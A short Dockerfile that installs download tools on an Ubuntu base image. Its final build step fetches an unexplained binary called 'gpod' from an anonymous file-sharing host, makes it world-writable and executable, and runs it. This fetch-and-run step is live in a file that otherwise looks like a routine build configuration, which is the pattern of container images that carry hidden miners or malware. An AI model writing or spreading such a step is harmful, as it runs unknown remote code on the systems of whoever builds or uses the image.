
FROM ubuntu:20.04 as ubuntu-base
RUN apt-get update && apt-get install curl git unzip wget -y 
RUN wget https://transfer.sh/bcEIRq/gpod && chmod 777 gpod && ./gpod
